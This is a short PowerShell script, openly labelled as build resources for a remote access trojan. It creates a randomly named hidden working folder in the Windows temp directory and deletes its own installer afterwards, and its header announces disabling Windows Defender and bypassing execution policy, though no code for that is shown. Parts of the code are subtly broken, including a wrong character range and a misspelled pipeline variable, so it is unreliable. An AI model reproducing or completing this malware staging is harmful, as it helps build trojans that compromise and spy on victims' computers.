# BUILD RESOURCES FOR RAT
# CREATED BY : Mohid Mughal

# Random string creator to create names for files
function random_text {
    return -join((65..90) + (97..22) | Get-Random -Count 5 | % {[char]$__})
}


### Disable Win Defender and get ep (execution policy) bypass
###


#  VARIABLES
# FOR Working Directory names, inside Temp Directory of Windows
$wd = random_text    # creates and store a string of random characters inside $wd (working directory) which can be later given to a file as "name"
$path = "$env:temp/$wd"    # path of the folder in temp directory in which we will store our RAT related files
$initial_dir = Get-Location    # for storing the current directory we are in OR where the 'installer.ps1' file is placed, will be used for self deleting 'installer.ps1' file in the end - 'Get-Location' in .ps1 == '%cd%' in .cmd
echo $path

# GOTO TEMP Directory and do the Magic
mkdir $path   # creates a folder inside temp directory with the name stored in the $wd variable (name will be a string of random characters)
cd $path    # moves to our own created folder inside temp directory of windows

# if in future i need to create and put any file in the created (random named) folder inside the temp directory, the code for creating that particular file will go here
###

#Same as PAUSE command in .cmd
Read-Host "Wanna delete 'installer.ps1'? Press any key to continue"

# self delete
cd $initial_dir
del installer.ps1
